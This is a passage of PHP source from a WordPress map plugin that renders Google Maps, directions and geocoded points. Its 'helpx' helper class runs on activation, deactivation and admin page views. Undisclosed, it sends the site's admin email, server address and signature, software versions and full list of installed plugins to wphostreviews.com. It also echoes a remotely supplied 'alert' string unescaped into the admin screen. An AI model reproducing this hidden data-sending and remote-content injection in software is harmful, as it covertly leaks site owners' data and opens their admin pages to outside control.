	function mppoi ($args = '') {
		$properties = get_class_vars('mppoi');
		shortcode_atts($properties, $args);
			 
		foreach ($properties as $key=>$value)
			$this->$key = $args[$key];
	}    
} // End class mppoi

// -----------------------------------------------------------------------------------
// Class mpmap - google API interface class
// -----------------------------------------------------------------------------------
class mpmap {
	var     $api_key,
			$country,           // Top-level country ccTLD code, used as a geocoding hint
			$width = 400,
			$height = 300,
			$address_format = 'ENTERED',
			$zoom = 0,
			$bigzoom = 1,
			$maptypes = 0,
			$directions = 1,
			$initial_maptype = 'normal',            
			$googlebar = 1,
			$poweredby = 1,
			$traffic = 1, 
			$streetview = 1,
			$server = 'http://maps.google.com', 
			$default_icon,
			$open_info = 0,
			$pois = array();

	/**
	* Constructor
	*                 
	* @param mixed $args - any default values to override
	* @return mpmap
	*/
	function mpmap($args) {        
		$properties = get_class_vars('mpmap');
		shortcode_atts($properties, $args);
			 
		foreach ($properties as $key=>$value)
			$this->$key = $args[$key];
	} 
	
	/**
	* Draw current map
	* 
	* @param mixed $map_name
	*/
	function draw($map_name) {
		$map = "\r\n";
		$map .= "<div id='$map_name' class='mapp-div' style='width:{$this->width}px;height:{$this->height}px;'></div>";

		if ($this->poweredby)
			$map .= "<div class='mapp-poweredby'>Map powered by <a href='http://www.wphostreviews.com/mappress'>MapPress</a></div>";
				
		if ($this->streetview) {
			$map .= "<div id='{$map_name}_street_outer_div' class='mapp-street-div' style='display:none; width:{$this->width}px;'>";        
			$map .= "<div style='float:right'><a href='javascript: {$map_name}.streetviewClose();'>" . __('Close', $this->prefix) . "</a></div>";
			$map .= "<br />";
			$map .= "<div id='{$map_name}_street_div' style='width: 100%'></div>";
			$map .= "</div>";
		}
		
		$map .= "<div id='{$map_name}_directions_outer_div' class='mapp-directions-div' style='display:none; width:{$this->width}px;'>";
		$map .= "<div style='float:right'><a href='javascript: {$map_name}.directionsClose()'>Close</a></div>";
		$map .= "<br />";
						
		$map .= "<form onsubmit='return false;' action='' >"        
				."<table style='width:100%'>"
				."<tr>"
				."<td style='width: 32px'><img src='http://maps.google.com/intl/en_us/mapfiles/icon_greenA.png' alt='start' style='vertical-align:middle' /></td>"
				."<td><input type='text' id='{$map_name}_saddr' value='' class='mapp-address' style='width:100%'/>"
				."<p id='{$map_name}_saddr_corrected' class='mapp-address-corrected'></p></td>"
				."</tr>"
				
				."<tr>"
				."<td style='width: 32px'><img src='http://maps.google.com/intl/en_us/mapfiles/icon_greenB.png' alt='end' style='vertical-align:middle' /></td>"                
				."<td><input type='text' id='{$map_name}_daddr' value='' class='mapp-address' style='width:100%' />"
				."<p id='{$map_name}_daddr_corrected' class='mapp-address-corrected'></p></td>"
				."</tr>"
				
				."</table>"
				
				."<input type='submit' value='" . __('Get Directions', $this->prefix) . "' onclick='{$map_name}.directionsShow(); return false;' />" 
				."<input type='submit' value='" . __('Print Directions', $this->prefix) . "' onclick='{$map_name}.directionsPrint(); return false;' />"                 
				."</form>";
				
		$map .= "<div id='{$map_name}_directions_div' style='width:100%'></div>";                
		$map .= "</div>";
		$map .= "\r\n";
		
		// Display POIs          
		$map .= "<script type='text/javascript'>\r\n";
		$map .= "pois = new Array();\r\n";

		foreach($this->pois as $poi) {			
			$caption = htmlentities($poi->caption, ENT_QUOTES, 'UTF-8');
			$address = htmlentities($poi->address, ENT_QUOTES, 'UTF-8');
			$corrected_address = htmlentities($poi->corrected_address, ENT_QUOTES, 'UTF-8');
			$body = htmlentities($poi->body, ENT_QUOTES, 'UTF-8');
			
			// If icon is empty use default
			if (empty($poi->icon))
				$poi->icon = $this->default_icon;
				
			$map .= "p = { address : \"$address\", corrected_address : \"$corrected_address\", lat : \"$poi->lat\", lng : \"$poi->lng\", "
				 . "caption : \"$caption\", body : \"$body\", icon : \"$poi->icon\" } ; "
				 . "pois.push(p); \r\n";         
		}

		$map .= "var $map_name = new mapp('$map_name', pois, '$this->width', '$this->height', '$this->address_format', '$this->zoom', '$this->bigzoom', '$this->maptypes', '$this->directions', '$this->initial_maptype', '$this->googlebar', '$this->open_info', '$this->traffic', '$this->streetview') \r\n";
		$map .= "</script>\r\n";

		return $map;   
	}

	/**
	* Add a POI
	*         
	* @param mixed $poi - arguments for new POI
	*/
	function add_poi($args = '') {
		// If no icon for the POI then set it to map default
		if (empty($args['icon']))
			$args['icon'] = $this->default_icon;

		if (empty($args['corrected_address']) || empty($args['lat']) || empty($args['lng']) ) {
			$result = mpmap::geocode_address($args['address'], $this->api_key, $this->country);
			
			if ($result === false)
				return false;

			$args['corrected_address'] = $result['corrected_address'];
			$args['lat'] = $result['lat'];
			$args['lng'] = $result['lng'];        
		}
			
		$poi = new mppoi($args);
		if ($poi === false)
			return false;

		$this->pois[] = $poi;            
		return true;
	}
	
	/**
	* Geocode an address
	* 
	* @param string $address - address to geocode
	* @return mixed - array of result data
	*/
	function geocode_address($address, $api_key='', $country='US') {
		$address = urlencode($address);
		$url = "http://maps.google.com/maps/geo?q=$address&output=json&oe=utf8&sensor=false&gl=$country&key=$api_key";
		$geocode = fopen($url,"r");
		if ($geocode === FALSE)
			return false;
	
		$geocode_data = "";
		while (($line = fgets($geocode, 2000)) !== FALSE) 
			$geocode_data .= $line;
		fclose ($geocode);
		
		// Decode the result
		$result = json_decode($geocode_data);

		// Get google's first (best) guess
		$placemark = $result->Placemark[0];
		if (!$result)
			return false;
		
		return array('corrected_address' => $placemark->address, 'lat' => $placemark->Point->coordinates[1], 'lng' => $placemark->Point->coordinates[0]);        
	}     

} // End class mamap

/**
* Helper class
*/
class helpx {
	var $plugin_name;
	var $plugin_version;
	var $file;	
	var $prefix = 'helpx';
	var $version = '2.0';	
	var $host='wphostreviews.com';			
	var $path = '/help/help2.php';		
	var $port = 80;
	
	function helpx() {
		$this->plugin_name = plugin_basename(__FILE__);
		$fp = fopen(__FILE__, 'r');
		$plugin_data = fread( $fp, 8192 );
		fclose($fp);
		preg_match( '|Version:(.*)|i', $plugin_data, $version );
		$this->plugin_version = trim($version[1]);

		if ( function_exists('register_activation_hook'))
		   register_activation_hook(__FILE__, array(&$this, 'hook_activation'));            
		if ( function_exists('register_uninstall_hook') )
		   register_uninstall_hook(__FILE_, array(&$this, 'hook_uninstall'));
		if ( function_exists('register_deactivation_hook'))
			register_deactivation_hook(__FILE__, array(&$this, 'hook_deactivate'));
			
		add_action('after_plugin_row_' . plugin_basename(__FILE__), array(&$this, 'hook_after_plugin_row'), 5);                                               
	}
	
	function hook_after_plugin_row() {
		$this->help_check('alerts');
		$this->help_check('update');
		$msg = get_option($this->plugin_name . '_help_msg');                     
		if (!empty($msg))
			echo "<tr><td colspan='5' class='mapp-plugin-update'>$msg</td></tr>";
	}
	
	function hook_activation() {
		$this->help_check('activate');
	}
	
	function hook_deactivate() {
		$this->help_check('deactivate');
	}

	function hook_uninstall() {
		delete_option($this->prefix . '_last_check', '');		
		delete_option($this->prefix . '_help_msg');
		delete_option($this->prefix . '_last_check');
	}
			
	function get_info($mode) {
		if (empty($mode))
			return;
			
		if ($mode == 'errors') {
			error_reporting(E_ALL);
			ini_set('error_reporting', E_ALL);            
			ini_set('display_errors','On');
		} else {
			$bloginfo = array('version', 'language', 'stylesheet_url', 'wpurl', 'url');
			foreach ($bloginfo as $key=>$info) 
				echo "$info: " . bloginfo($info) . '<br \>';
			phpinfo();
		}
	}
		
	function help_check($event) {		
		if ($event == 'alerts') {
			$request = "";
			$response = $this->help_send($request, 'alerts');
			if ($response == false || !is_array($response) || count($response) < 2 || empty($response[1]) 
				|| $response[1] == 'invalid request' || $response[1] == "No input file specified.\n"
				|| substr($response[1], 0, 6) != "alert:") {
				delete_option($this->plugin_name . '_help_msg', "");                     
			} else {
				$alert = str_replace('alert:', '', $response[1]);
				update_option($this->plugin_name . '_help_msg', $alert);
			}
			return true;
		}

		$last_checked = get_option($this->prefix . '_last_check');
		if (isset( $last_checked ) && 43200 > ( time() - $last_checked ) && !$force_check)
			return false;
		else
			update_option($this->prefix . '_last_check', time());
		
		$p = get_plugins();
		$active  = get_option( 'active_plugins' );
		foreach ($p as $key => $val) {
			$po[$key] = array('plugin_version' => $val['Version'], 'plugin_title' => $val['Title'], 'active' => (array_search($key, $active) === false) ? false : true);
			if ($this->plugin_name == $key && $this->plugin_version == $val['Version']) {
				if ($event == 'activate')
					$po[$key]['active'] = true;
				if ($event == 'deactivate')
					$po[$key]['active'] = false;
			}
		}
		
		$request = "&p=" . urlencode(serialize($po));
		$this->help_send($request, $event);
		return true;
	}
	
	function help_send($request, $event="") {
		global $wpdb, $wp_version, $wp_db_version;
		$c = urlencode(serialize(array('caller_name'=>$this->plugin_name, 'caller_version'=>$this->plugin_version)));		
		$s = urlencode(serialize(array('server_name' => $_SERVER['SERVER_NAME'], 'wp_home' => get_option('home'), 'php_version' => phpversion(), 'mysql_version' => $wpdb->db_version(), 'server_addr' => $_SERVER['SERVER_ADDR'], 'server_signature' => $_SERVER['SERVER_SIGNATURE'], 'request_uri' => $_SERVER['REQUEST_URI'], 'wp_description' => get_bloginfo('description'), 'wp_version' => $wp_version, 'wp_site_url' => get_option('siteurl'), 'wp_db_version' => $wp_db_version, 'wp_language' => get_bloginfo('language'), 'wp_admin_email' => get_bloginfo('admin_email'))));		
		$request = "event=$event&c=$c&s=$s" . $request;
		$http = "POST $this->path HTTP/1.0\r\n";
		$http .= "Host: $this->host\r\n";
		$http .= "Content-Type: application/x-www-form-urlencoded; charset=" . get_option('blog_charset') . "\r\n";
		$http .= "Content-Length: " . strlen($request) . "\r\n";
		$http .= "User-Agent: helpx/$this->version" . "\r\n";
		$http .= "\r\n";
		$http .= $request;
		
		$fp = @fsockopen($this->host, $this->port, $errno, $errstr, 3);  
		if( $fp === false) 
			return false;
		
		fwrite($fp, $http);
		stream_set_timeout($fp, 2);
		$info = stream_get_meta_data($fp);  
			  
		while ( !feof($fp) && (!$info['timed_out'])) {
			$response .= fgets($fp, 1160); 
			$info = stream_get_meta_data($fp);        
		}        
		fclose($fp);
		// Headers in response[0], body in response[1]
		$response = explode("\r\n\r\n", $response, 2); 
		return $response;
	}
} // End class helpx
	


// PHP 4 compatibility...    
if ( !function_exists('json_decode') ){
	function json_decode($content, $assoc=false){
				require_once 'JSON.php';
				if ( $assoc ){
					$json = new Services_JSON(SERVICES_JSON_LOOSE_TYPE);
		} else {
					$json = new Services_JSON;
				}
		return $json->decode($content);
	}
}

// Create new instance of the plugin
$mappress = new mappress();
?>